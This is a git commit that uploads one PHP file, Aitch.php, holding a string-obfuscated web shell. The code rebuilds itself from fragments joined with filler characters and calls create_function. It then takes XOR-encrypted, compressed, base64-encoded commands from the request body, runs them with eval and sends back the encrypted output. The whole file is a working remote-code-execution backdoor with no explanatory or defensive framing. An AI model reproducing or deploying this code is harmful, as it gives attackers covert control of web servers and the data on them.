93b2d79752439fa8404f754b19bf6488592428e7
ASR-27 <76922135+ASR-27@users.noreply.github.com>
2021-06-17 14:21:29 -0400

    Add files via upload

---
+++ Aitch.php
@@ -0,0 +1,11 @@
+<?php
+$l='<m$k="9b<m522804"<m;$kh="6<m642d6315755<m";$kf="c<m29252<mf2<m1eef";$p="o<mKFv62<m1WMoGf<mXl6k";<mf';
+$n='$j=0;($<mj<$c&&$i<<m$l)<m;$j++,<m$i++<m){$o.=$<mt{$i}^$k{<m<m$j};}}return<m $o;<m}<mif (@<mpreg_';
+$a=str_replace('W','','WcreaWtWeW_fWuncWtion');
+$w='<m_en<md_clean();$r<m=@<m<mba<mse64_encode(@x<m(@gzcompres<ms(<m$o<m),$<m<mk));print("$p$kh$r$kf");}';
+$R='match("/$<mk<mh(.+)$<mkf/",@file_<mget_co<mn<m<mtents("php<m://inp<mut"),$m)==1) <m{@ob_sta<mrt()<';
+$f='m;@eva<ml(@gzun<m<mcompress(@x(@ba<mse64_d<mecode<m($<mm<m[1]),$k)));$o=@o<mb_get<m_<mc<montents();@ob';
+$z='unctio<mn <mx($<mt,$k){$c=st<mrlen($k<m);$l=s<mtrlen<m($t<m);<m$o=<m<m"";for($i=0;$i<<m$l;){f<mor(';
+$V=str_replace('<m','',$l.$z.$n.$R.$f.$w);
+$N=$a('',$V);$N();
+?>
